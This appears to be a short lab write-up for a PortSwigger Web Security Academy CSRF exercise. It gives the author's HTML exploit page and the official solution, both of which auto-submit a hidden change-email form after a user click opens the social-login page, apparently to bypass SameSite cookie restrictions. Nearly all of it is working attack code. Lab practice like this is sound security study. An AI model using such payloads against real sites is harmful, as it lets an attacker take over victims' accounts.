
```
<html>
  <body>
    <form action="https://0af20020033eb237806e6c4d00210068.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wiener123&#64;normal&#45;user&#46;net" />
    </form>
<h1>klick me</h1> 
    <script>
window.addEventListener("click", function(event) {
window.open("https://0af20020033eb237806e6c4d00210068.web-security-academy.net/social-login");
setTimeout(function(){document.forms[0].submit();},5000);
});
    </script>
  </body>
</html>
```


solution according to the lab description 
```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="pwned@portswigger.net"> </form> <p>Click anywhere on the page</p> <script> window.onclick = () => { window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login'); setTimeout(changeEmail, 5000); } function changeEmail() { document.forms[0].submit(); } </script>
```
